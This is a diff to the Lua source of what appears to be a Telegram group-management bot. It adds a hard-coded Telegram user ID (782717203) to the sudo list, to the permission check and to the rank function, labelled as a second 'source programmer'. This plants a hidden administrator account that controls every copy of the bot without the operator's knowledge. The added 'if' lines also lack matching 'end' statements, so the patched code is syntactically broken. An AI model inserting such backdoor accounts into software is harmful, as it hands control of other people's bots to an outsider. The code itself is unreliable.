@@ -186,6 +186,20 @@ end
 end  
 return BOYKA  
 end 
+
+function vardump(value)  
+print(serpent.block(value, {comment=false}))   
+end 
+sudo_users = {SUDO,782717203}   
+function SudoBot(msg)  
+local BOYKA = false  
+for k,v in pairs(sudo_users) do  
+if tonumber(msg.sender_user_id_) == tonumber(v) then  
+BOYKA = true  
+end  
+end  
+return BOYKA  
+end 
 function DevBOYKAW(msg) 
 local hash = database:sismember(bot_id.."DEV:Sudo:T", msg.sender_user_id_) 
 if hash or SudoBot(msg) then  
@@ -260,6 +274,8 @@ end
 function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(554921096) then
 var = true  
+if tonumber(user_id) == tonumber(782717203) then
+var = true 
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
 elseif tonumber(user_id) == tonumber(bot_id) then
@@ -291,6 +307,8 @@ end
 function Rutba(user_id,chat_id)
 if tonumber(user_id) == tonumber(554921096) then
 var = 'مبرمج السورس'
+if tonumber(user_id) == tonumber(782717203) then
+var = 'مبرمج السورس 2'
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = 'المطور الاساسي'  
 elseif database:sismember(bot_id.."DEV:Sudo:T", user_id) then 
